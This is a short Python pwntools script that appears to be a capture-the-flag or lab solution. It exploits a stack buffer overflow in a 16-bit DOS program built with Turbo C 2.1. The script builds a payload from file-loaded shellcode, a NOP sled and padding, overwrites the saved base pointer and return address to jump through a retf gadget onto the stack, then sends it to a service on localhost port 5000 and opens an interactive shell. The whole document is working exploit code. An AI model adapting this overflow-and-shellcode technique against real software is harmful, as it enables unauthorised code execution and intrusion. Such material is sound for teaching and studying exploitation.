from pwn import *

with open('shellcode.com', 'rb') as f:
    shellcode = f.read()

# nopsled
shellcode = 32*b'\x90' + shellcode

ds_ida = 0x110F
cs_ida = 0x1000

cs = 0x0F78  # get experimentally from any Turbo C 2.1 compiled exe loaded to the same environment (see TEST.C)
ds = cs + (ds_ida - cs_ida)
# please note ds == ss

payload = (
    shellcode +
    (0x100 - len(shellcode))*b'\x90' +
    p16(0xFFDC) +  # pop bp
    p16(0x01D8) +  # retn -> to "retf" at cs:01D8
    p16(0xFEE0) + p16(ds) +  # retf -> to the stack at ds:FEE0
    b'\n\n'
)

conn = remote('localhost', 5000)
log.info('sending payload: %r', payload)
conn.send(payload)
conn.interactive()
